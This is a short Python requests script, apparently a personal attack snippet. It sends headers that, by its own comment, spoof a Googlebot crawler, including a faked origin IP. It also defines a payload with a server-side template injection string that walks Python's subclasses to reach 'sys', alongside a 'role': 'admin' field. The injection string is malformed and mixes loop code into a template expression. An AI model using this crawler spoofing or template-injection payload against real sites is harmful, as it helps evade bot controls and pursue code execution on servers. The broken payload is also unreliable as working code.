import requests
#change url
url = "https://httpbin.org/get"
#headers which spoof you as a google web crawler
headers = {
'content-type': 'application/json;charset=UTF-8',
'X-Robots-Tag': 'googlebot',
'googlebot': 'noindex',
'User-agent-token' : 'Googlebot',
'SEC-CH-UA-PLATFORM' : 'Linux',
'origin' : '34.100.182.96',
'user-agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36'
}
#pay no attention to payload its an example unrelated to the spoofing
payload = {
    "role":'admin',
    "OS type": "{{os}}",
    'formData': {
    'bio' : "{{''.__class__.__base__.__subclasses__()"+
"for i, val in enumerate(class_l):"+
  "    try: "+
  "        val.__init__.__globals__['sys']"+
  "        print(i, val)"+
  "    except:"+
  "        pass}}",
      }
  }
#look at documentation to change requests parametes and add a param for json if you want to insert the payload
response = requests.get(url, headers=headers)
#ouput
print("Status Code: ", response.status_code)
try:
  print("JSON Response: ", response.json())
except:
  print("response was not in json")
